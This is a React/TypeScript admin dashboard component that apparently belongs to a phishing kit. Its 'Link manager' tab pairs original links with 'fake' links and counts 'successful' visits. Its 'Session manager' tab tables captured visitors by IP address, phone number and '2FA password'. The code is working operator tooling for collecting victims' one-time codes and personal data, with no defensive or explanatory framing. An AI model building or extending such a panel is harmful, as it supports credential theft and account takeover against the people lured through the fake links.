import { FC, useState, useContext, useEffect } from "react";
import { observer } from "mobx-react-lite";
import { ctx } from "../..";
import LinkService from "../../services/LinkService";
import m from "./AdminPage.module.sass"
import { useQuery } from "../../hooks/useQueryHook";
import { useParams } from "react-router-dom";
import { socket } from "../../websocket/socket";
import Input from "../../component/Input/Input";
import { IAdminLink } from "../../models/IAdminLink";
import AdminService from "../../services/AdminService";
import AdminLink from "../../component/AdminLink/AdminLink";
import { IAdminInfo } from "../../models/IAdminInfo";
import { IVisitor } from "../../models/IVisitor";
import VisitorService from "../../services/VisitorService";
import AdminVisitor from "../../component/AdminVisitor/AdminVisitor";
import { IAdminVisitor } from "../../models/IAdminVisitor";
import Spinner from "../../component/Spinner/Spinner";

const AdminPage: FC = () => {

    const {store} = useContext(ctx)
    const [links, setLinks] = useState<IAdminLink[]>([])
    const [activeTab, setActiveTab] = useState<boolean>(false)
    const [link, setLink] = useState<IAdminLink>({} as IAdminLink)
    const [info, setInfo] = useState<IAdminInfo>()
    const [visitors, setVisitors] = useState<IAdminVisitor[]>([])
    const [loading, setLoading] = useState<boolean>(false)

    const loadInfo = async () => {
        const {data} = await AdminService.getInfo()
        setInfo(data.json)
    }

    const loadVisitors = async () => {
        const {data} = await VisitorService.getAll()
        setVisitors(data.json)
    }

    const loadConfig = async () => {
        await loadInfo()
        await loadVisitors()
        let {data} = await AdminService.getLinks()
        setLinks(data.json)
    }

    const createLink = async (e: any) => {
        e.preventDefault()
        const {data} = await AdminService.createLink(link)
        setLink({
            origin: "",
            fake: "",
            tag: ""
        } as IAdminLink)
        setLinks([
            ...links,
            data.json
        ])
        await loadInfo()
    }

    const deleteLink = async (id:string) => {
        const {data} = await AdminService.deleteLink(id)
        setLinks(prev => {
            return prev.filter(link => link.id !== data.json.id)
        })
        await loadInfo()
    }

    const deleteVisitor = async (id:string) => {
        const {data} = await VisitorService.delete(id)
        setVisitors(prev => {
            return prev.filter(visitor => visitor.id !== data.json.id)
        })
        await loadInfo()
    }

    useEffect(() => {
        loadConfig()
    }, [])

    if(!info) return <div className={m.LoadingWrapper}>
        <Spinner mini/>
        <p>Loading...</p>
    </div>

    return (
        <div className={m.AdminPageWrapper}>
            <div className={m.Content}>
                {
                    activeTab 
                        ? 
                        <div className={m.TabWrapper}>
                            <div className={m.Blocks}>
                                <div className={m.Block}>
                                    <h3 className={m.BlockTitle}>
                                        Total visitors
                                    </h3>
                                    <h1>{info.totalVisits}</h1>
                                </div>
                                <div className={m.Block}>
                                    <h3 className={m.BlockTitle}>
                                        Successfull visitors
                                    </h3>
                                    <h1>{info.successfullVisits}</h1>
                                </div>
                            </div>
                            <div className={m.TableWrapper}>
                                <table className={m.Table}>
                                    <tr>
                                        <th>id</th>
                                        <th>refer id</th>
                                        <th>status</th>
                                        <th>ip</th>
                                        <th>2FA password</th>
                                        <th>phone</th>
                                        <th>Actions</th>
                                    </tr>
                                    {
                                        visitors && visitors.length ?
                                        visitors.map(visitor => <AdminVisitor deleteCb={deleteVisitor} visitor={visitor} key={visitor.id}/>)
                                        :
                                        <div className={m.TableMessage}>
                                            <p>There are no visitors</p>
                                        </div>
                                    }

                                </table>
                            </div>
                        </div>
                        :
                        <div className={m.TabWrapper}>   
                            <div className={m.Block}>
                                <h3 className={m.BlockTitle}>
                                    <p>There are no links</p>
                                </h3>
                                <form className={m.Form} onSubmit={createLink}>
                                    <div className={m.Inputs}>
                                        <Input
                                            placeholder="Original link"
                                            onChange={(v) => setLink({
                                                ...link, 
                                                origin: v
                                            })}
                                            required
                                            value={link.origin}
                                        />
                                        <Input
                                            placeholder="Fake link"
                                            onChange={(v) => setLink({
                                                ...link, 
                                                fake: v
                                            })}
                                            required
                                            value={link.fake}
                                        />
                                        <Input
                                            placeholder="Tag"
                                            onChange={(v) => setLink({
                                                ...link, 
                                                tag: v
                                            })}
                                            value={link.tag}
                                            required
                                        />
                                    </div>
                                    <button> Create Link </button>
                                </form>
                            </div>
                            <div className={m.Blocks}>
                                <div className={m.Block}>
                                    <h3 className={m.BlockTitle}>
                                        Total links
                                    </h3>
                                    <h1>{info.totalLinks}</h1>
                                </div>
                                <div className={m.Block}>
                                    <h3 className={m.BlockTitle}>
                                        Total visits
                                    </h3>
                                    <h1>{info.totalVisits}</h1>
                                </div>
                                <div className={m.Block}>
                                    <h3 className={m.BlockTitle}>
                                        Successfull visits
                                    </h3>
                                    <h1>{info.successfullVisits}</h1>
                                </div>
                            </div>
                            <div className={m.TableWrapper}>
                                <table className={m.Table}>
                                    <tr>
                                        <th>Original link</th>
                                        <th>Fake link</th>
                                        <th>Tag</th>
                                        <th>Visits</th>
                                        <th>Successfull visits</th>
                                        <th>Status</th>
                                        <th>Actions</th>
                                    </tr>
                                    {
                                        links && links.length ?
                                        links.map((link: IAdminLink) => <AdminLink deleteCb={deleteLink} link={link} key={link.id}/>)
                                        :
                                        <div className={m.TableMessage}>
                                            <p>There are no links</p>
                                        </div>
                                    }

                                </table>
                            </div>
                        </div>
                }
            </div>
            <div className={m.Header}>
                <button className={`${m.HeaderLink} ${activeTab ? m.Active : m.Inactive}`} onClick={() => setActiveTab(true)}>
                    Session manager
                </button>
                <div className={m.Logo}>
                    <h2>wtpru</h2>
                </div>
                <button className={`${m.HeaderLink} ${activeTab ? m.Inactive : m.Active}`} onClick={() => setActiveTab(false)}>
                    Link manager
                </button>
            </div>
        </div>
    )
}

export default observer(AdminPage)